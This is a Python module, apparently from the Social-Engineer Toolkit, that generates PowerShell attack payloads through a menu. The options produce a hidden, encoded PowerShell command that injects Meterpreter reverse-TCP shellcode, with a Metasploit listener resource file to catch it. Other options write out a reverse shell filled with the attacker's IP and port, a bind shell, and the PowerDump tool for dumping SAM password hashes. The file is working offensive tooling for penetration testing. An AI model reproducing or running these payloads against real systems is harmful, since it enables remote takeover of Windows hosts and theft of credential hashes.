#!/usr/bin/python
#
#
# handle powershell payloads and get them ready
#
#
#
from src.core.setcore import *
from src.core.menu import text

me = mod_name()

debug_msg(me, "printing 'text.powershell menu'",5)
show_powershell_menu = create_menu(text.powershell_text, text.powershell_menu)
powershell_menu_choice = raw_input(setprompt(["29"], ""))

if powershell_menu_choice != "99":
    # specify ipaddress of reverse listener
    ipaddr = grab_ipaddress()
    update_options("IPADDR=" + ipaddr)

    # if we select alphanumeric shellcode
    if powershell_menu_choice == "1":
        port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
        if port == "": port = "443"
        update_options("PORT=" + port)
        update_options("POWERSHELL_SOLO=ON")
        print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")

        filewrite = file(setdir + "/payload_options.shellcode", "w")
        filewrite.write("windows/meterpreter/reverse_tcp " + port + ",")
        filewrite.close()

        try: reload(src.payloads.powershell.prep)
        except: import src.payloads.powershell.prep
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")

        # here we format everything for us
        x86 = file(setdir + "/x86.powershell", "r")
        x86 = x86.read()
        x86 = "powershell -nop -win hidden -noni -enc " + x86
        print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
        filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
        filewrite.write(x86)
        filewrite.close()

        choice = yesno_prompt("0","Do you want to start the listener now [yes/no]: ")
        if choice == 'NO':
            pass

        # if we want to start the listener
        if choice == 'YES':
            filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
            filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j" % (port))
            filewrite.close()
            msf_path = meta_path()
            subprocess.Popen("%smsfconsole -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()

        print_status("Powershell files can be found under %s/reports/powershell/" % (setdir))
        return_continue()

    # if we select powershell reverse shell
    if powershell_menu_choice == "2":

        # prompt for IP address and port
        port = raw_input(setprompt(["29"], "Enter the port for listener [443]"))
        # default to 443
        if port == "": port = "443"
        # open the reverse shell up
        print_status("Rewriting the powershell reverse shell with options")
        fileopen = file("src/powershell/reverse.powershell", "r")
        data = fileopen.read()
        data = data.replace("IPADDRHERE", ipaddr)
        data = data.replace("PORTHERE", port)
        print_status("Exporting the powershell stuff to %s/reports/powershell" % (setdir))
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")
        filewrite = file(setdir + "/reports/powershell/powershell.reverse.txt", "w")
        filewrite.write(data)
        filewrite.close()

        choice = yesno_prompt("0","Do you want to start a listener [yes/no]")
        if choice == "NO":
            print_status("Have netcat or standard socket listener on port %s" % (port))
        if choice == "YES":
            socket_listener(port)

        return_continue()

    # if we select powershell bind shell
    if powershell_menu_choice == "3":

        port = raw_input(setprompt(["29"], "Enter the port for listener [443]"))

        # open file
        fileopen = file("src/powershell/bind.powershell", "r")
        data = fileopen.read()
        data = data.replace("PORTHERE", port)
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")
        filewrite = file(setdir + "/reports/powershell/powershell.bind.txt", "w")
        filewrite.write(data)
        filewrite.close()
        print_status("The powershell program has been exported to %s/reports/powershell/" % (setdir))
        return_continue()


    # if we select powershell powerdump SAM dump
    if powershell_menu_choice == "4":

        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")
        # copy file
        if os.path.isfile("src/powershell/powerdump.encoded"):
            shutil.copyfile("src/powershell/powerdump.encoded", setdir + "/reports/powershell/powerdump.encoded.txt")
        print_status("The powershell program has been exported to %s/reports/powershell/" % (setdir))
        print_status("Note with PowerDump -- You MUST be running as SYSTEM when executing.")
        return_continue()
